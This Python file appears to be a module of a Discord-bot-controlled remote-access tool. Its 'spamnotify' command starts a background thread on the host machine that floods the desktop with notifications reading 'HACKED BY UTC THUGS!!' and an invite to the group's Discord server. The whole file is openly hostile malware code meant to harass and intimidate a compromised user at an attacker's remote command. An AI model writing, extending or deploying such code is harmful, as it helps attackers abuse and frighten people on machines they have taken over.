import discord
import threading
import time
from plyer import notification

class NotificationSpam:
    def __init__(self):
        self.active = False

    def start(self, title):
        self.active = True
        threading.Thread(target=self._spam_notifications, args=(title,), daemon=True).start()

    def stop(self):
        self.active = False

    def _spam_notifications(self, title):
        while self.active:
            notification.notify(
                title=title,
                message="HACKED BY UTC THUGS!! JOIN https://discord.gg/zoom NOW!!!",
                timeout=1
            )
            time.sleep(0.4)

notification_spam_instance = NotificationSpam()

async def spamnotify(ctx, action: str, *, title: str):
    if action.lower() == "start":
        notification_spam_instance.start(title)
        await ctx.send(f"Notification spam started with title: {title}")
    elif action.lower() == "stop":
        notification_spam_instance.stop()
        await ctx.send("Notification spam stopped.")
    else:
        await ctx.send("Invalid action. Use 'start' or 'stop'.")
